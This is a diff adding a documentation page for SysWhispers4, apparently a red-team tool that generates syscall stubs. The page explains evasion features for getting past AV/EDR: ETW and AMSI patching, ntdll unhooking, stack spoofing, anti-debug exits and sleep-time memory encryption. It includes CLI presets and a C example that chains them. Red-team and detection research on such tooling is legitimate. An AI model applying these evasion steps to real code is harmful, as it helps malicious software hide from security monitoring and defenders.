@@ -1,0 +1,310 @@
+---
+title: 'Evasion Techniques'
+description: 'Overview of obfuscation, anti-analysis, and runtime evasion features'
+icon: 'shield'
+---
+
+## What Are Evasion Techniques?
+
+Beyond bypassing API hooks via direct syscalls, SysWhispers4 includes **8 additional evasion capabilities** that help your code avoid detection by AV/EDR products, memory scanners, and security analysts.
+
+These techniques target different layers of the detection stack:
+
+- **Static signatures** (on-disk binary analysis)
+- **Runtime memory scanning** (periodic memory sweeps)
+- **Call stack analysis** (stack-walking EDR)
+- **Behavioral monitoring** (ETW, AMSI)
+- **Dynamic analysis** (debuggers, sandboxes)
+
+## Available Evasion Features
+
+<CardGroup cols={2}>
+  <Card title="Obfuscation" icon="shuffle" href="/cli/evasion-options#obfuscation">
+    Randomize stub order + inject 14 junk instruction variants.
+  </Card>
+  <Card title="SSN Encryption" icon="lock" href="/cli/evasion-options#ssn-encryption">
+    XOR-encrypt syscall numbers at rest. Decrypt just before use.
+  </Card>
+  <Card title="Stack Spoofing" icon="layer-group" href="/advanced/stack-spoofing">
+    Synthetic return addresses from ntdll for call stack walkers.
+  </Card>
+  <Card title="ETW Bypass" icon="ban" href="/cli/evasion-options#etw-bypass">
+    Patch `EtwEventWrite` to suppress user-mode telemetry.
+  </Card>
+  <Card title="AMSI Bypass" icon="virus-slash" href="/cli/evasion-options#amsi-bypass">
+    Patch `AmsiScanBuffer` to return E_INVALIDARG.
+  </Card>
+  <Card title="ntdll Unhooking" icon="broom" href="/cli/evasion-options#ntdll-unhooking">
+    Remap clean `.text` section from `\KnownDlls\` to remove ALL hooks.
+  </Card>
+  <Card title="Anti-Debug" icon="bug-slash" href="/cli/evasion-options#anti-debug">
+    6 detection checks: PEB, timing, heap flags, debug port.
+  </Card>
+  <Card title="Sleep Encryption" icon="bed" href="/advanced/sleep-encryption">
+    Ekko-style XOR `.text` section during sleep to evade memory scans.
+  </Card>
+</CardGroup>
+
+## Quick Comparison
+
+| Feature | Target | Bypass Type | Performance Impact | Stealth Level |
+|---------|--------|-------------|:------------------:|:-------------:|
+| Obfuscation | Static signatures | Code mutation | Low | Medium |
+| SSN Encryption | Memory scanners | Data encryption | Very Low | Medium |
+| Stack Spoofing | Call stack walkers | RIP spoofing | Low | High |
+| ETW Bypass | User-mode telemetry | API patching | Low | High |
+| AMSI Bypass | PowerShell/script scanning | API patching | Low | High |
+| ntdll Unhooking | All inline hooks | Section remapping | Medium | Very High |
+| Anti-Debug | Debuggers/sandboxes | Environment checks | Low | Medium |
+| Sleep Encryption | Memory scanners | Runtime encryption | Medium | Very High |
+
+## Evasion Layers
+
+### Layer 1: Static Detection (Disk)
+
+**Obfuscation** (`--obfuscate`) mutates your binary to evade signature-based detection:
+
+- **Stub reordering:** Randomize function order in the `.text` section
+- **Junk instructions:** Insert 14 variants of harmless opcodes between real instructions
+
+```asm
+; Without obfuscation:
+mov r10, rcx
+mov eax, [SW4_SsnTable+N]
+syscall
+ret
+
+; With obfuscation:
+nop
+mov r10, rcx
+xchg ax, ax              ; Junk: 2-byte NOP
+mov eax, [SW4_SsnTable+N]
+lea r11, [r11]           ; Junk: no-op LEA
+syscall
+fnop                     ; Junk: FPU no-op
+ret
+```
+
+**SSN Encryption** (`--encrypt-ssn`) XORs all SSN values with a random compile-time key:
+
+```c
+// Encrypted SSN table in binary:
+SW4_SsnTable[0] = 0x18 ^ 0xDEADF00D;  // Encrypted at compile time
+```
+
+```asm
+; Decrypt at runtime:
+mov eax, DWORD PTR [SW4_SsnTable+N]  ; Load encrypted SSN
+xor eax, SW4_XOR_KEY                  ; Decrypt
+syscall                               ; Use plaintext SSN
+```
+
+### Layer 2: Runtime Detection (Memory)
+
+**Sleep Encryption** (`--sleep-encrypt`) protects your code during sleep periods:
+
+```c
+// Instead of Sleep(5000):
+SW4_SleepEncrypt(5000);
+
+// Flow:
+// 1. XOR-encrypt entire .text section with RDTSC-derived key
+// 2. Set waitable timer for 5000ms
+// 3. Queue APC to decrypt .text when timer fires
+// 4. Sleep in alertable state (encrypted)
+// 5. Timer → APC → decrypt → resume execution
+```
+
+**Benefits:**
+- Memory scanners see encrypted gibberish during sleep
+- YARA signatures don't match encrypted code
+- Periodic module scans fail
+
+**ntdll Unhooking** (`--unhook-ntdll`) removes ALL inline hooks:
+
+```c
+SW4_UnhookNtdll();  // Map clean ntdll from \KnownDlls\
+SW4_Initialize();   // Now reads clean stubs
+```
+
+Replaces the hooked `.text` section with a pristine copy from disk.
+
+### Layer 3: Behavioral Monitoring
+
+**ETW Bypass** (`--etw-bypass`) suppresses user-mode Event Tracing for Windows:
+
+```c
+SW4_PatchEtw();  // Patches ntdll!EtwEventWrite
+
+// After patch:
+// EtwEventWrite() → ret STATUS_ACCESS_DENIED
+```
+
+<Warning>
+This only bypasses **user-mode ETW**. Kernel-mode ETW-Ti (`Microsoft-Windows-Threat-Intelligence`) operates at the kernel level and cannot be bypassed from user-mode.
+</Warning>
+
+**AMSI Bypass** (`--amsi-bypass`) disables script content scanning:
+
+```c
+SW4_PatchAmsi();  // Patches amsi!AmsiScanBuffer
+
+// After patch:
+// AmsiScanBuffer() → ret E_INVALIDARG (scan skipped)
+```
+
+Useful when executing PowerShell, VBScript, or other AMSI-instrumented content.
+
+### Layer 4: Call Stack Analysis
+
+**Stack Spoofing** (`--stack-spoof`) makes your call chain appear legitimate to stack-walking EDR:
+
+```asm
+; Normal stack walker sees:
+; yourPE.exe!YourFunction+0x42  ⚠️ Suspicious
+; ntdll.dll!NtAllocateVirtualMemory+0x14
+; KERNEL32.DLL!BaseThreadInitThunk+0x14
+
+; With stack spoofing:
+; ntdll.dll!LdrLoadDll+0x88  ✅ Looks legitimate
+; ntdll.dll!NtAllocateVirtualMemory+0x14
+; KERNEL32.DLL!BaseThreadInitThunk+0x14
+```
+
+The spoofed return address points into ntdll, hiding the real caller.
+
+### Layer 5: Analysis Environments
+
+**Anti-Debug** (`--anti-debug`) detects debuggers and instrumentation:
+
+```c
+if (!SW4_AntiDebugCheck()) {
+    // Debugger detected — bail out
+    ExitProcess(0);
+}
+```
+
+**6 detection techniques:**
+
+| Check | Technique | Detects |
+|-------|-----------|----------|
+| 1 | `PEB.BeingDebugged` | Debugger attachment |
+| 2 | `NtGlobalFlag` | Heap debug flags |
+| 3 | RDTSC timing | Single-stepping |
+| 4 | `NtQueryInformationProcess(ProcessDebugPort)` | Kernel debug port |
+| 5 | Heap flags | Debug heap indicators |
+| 6 | Instrumentation callback | EDR instrumentation |
+
+## Recommended Configurations
+
+### Minimum Stealth (Quick Testing)
+```bash
+python syswhispers.py --preset common
+```
+No extra evasion. Fast generation and execution.
+
+### Standard Red Team
+```bash
+python syswhispers.py --preset injection \
+    --method indirect \
+    --resolve freshycalls \
+    --obfuscate \
+    --encrypt-ssn
+```
+Basic obfuscation + encrypted SSNs. Good balance.
+
+### High Evasion
+```bash
+python syswhispers.py --preset stealth \
+    --method randomized \
+    --resolve recycled \
+    --obfuscate \
+    --encrypt-ssn \
+    --stack-spoof \
+    --unhook-ntdll
+```
+Multi-layer evasion: obfuscation + encryption + stack spoofing + unhooking.
+
+### Maximum Evasion (All Techniques)
+```bash
+python syswhispers.py --preset stealth \
+    --method randomized \
+    --resolve recycled \
+    --obfuscate \
+    --encrypt-ssn \
+    --stack-spoof \
+    --etw-bypass \
+    --amsi-bypass \
+    --unhook-ntdll \
+    --anti-debug \
+    --sleep-encrypt
+```
+Every evasion feature enabled. Slowest generation, highest stealth.
+
+## Integration Example
+
+```c
+#include "SW4Syscalls.h"
+
+int main(void) {
+    // Layer 1: Remove hooks before initialization
+    SW4_UnhookNtdll();
+
+    // Layer 2: Resolve SSNs
+    if (!SW4_Initialize()) return 1;
+
+    // Layer 3: Bypass behavioral monitoring
+    SW4_PatchEtw();
+    SW4_PatchAmsi();
+
+    // Layer 4: Verify clean environment
+    if (!SW4_AntiDebugCheck()) {
+        // Debugger detected
+        return 0;
+    }
+
+    // Layer 5: Use syscalls with stack spoofing
+    PVOID base = NULL;
+    SIZE_T size = 0x1000;
+    SW4_NtAllocateVirtualMemory(
+        GetCurrentProcess(), &base, 0, &size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+    );
+
+    // Layer 6: Encrypted sleep
+    SW4_SleepEncrypt(5000);  // .text encrypted during sleep
+
+    return 0;
+}
+```
+
+## Detection Vectors Not Addressed
+
+<Warning>
+SysWhispers4 is a **user-mode** evasion tool. It does not bypass:
+
+- **Kernel-mode ETW-Ti callbacks** — requires kernel driver or exploit
+- **Kernel-mode syscall hooks** — requires SSDT/inline kernel hooks (rare)
+- **Virtualization-based security (VBS)** — Credential Guard, HVCI
+- **Network traffic analysis** — C2 communication patterns
+- **Endpoint behavioral heuristics** — post-exploitation activity patterns
+
+Use SysWhispers4 as part of a **layered evasion strategy**, not a silver bullet.
+</Warning>
+
+## Learn More
+
+<CardGroup cols={2}>
+  <Card title="Evasion Options Reference" icon="book" href="/cli/evasion-options">
+    Detailed documentation for all 8 evasion flags with code examples.
+  </Card>
+  <Card title="Sleep Encryption Deep Dive" icon="microscope" href="/advanced/sleep-encryption">
+    In-depth analysis of Ekko-style memory encryption technique.
+  </Card>
+  <Card title="Stack Spoofing Internals" icon="layer-group" href="/advanced/stack-spoofing">
+    How synthetic call frames bypass stack-walking EDR products.
+  </Card>
+  <Card title="EDR Detection Analysis" icon="radar" href="/advanced/edr-detection">
+    Comprehensive breakdown of what modern EDR can and cannot detect.
+  </Card>
+</CardGroup>
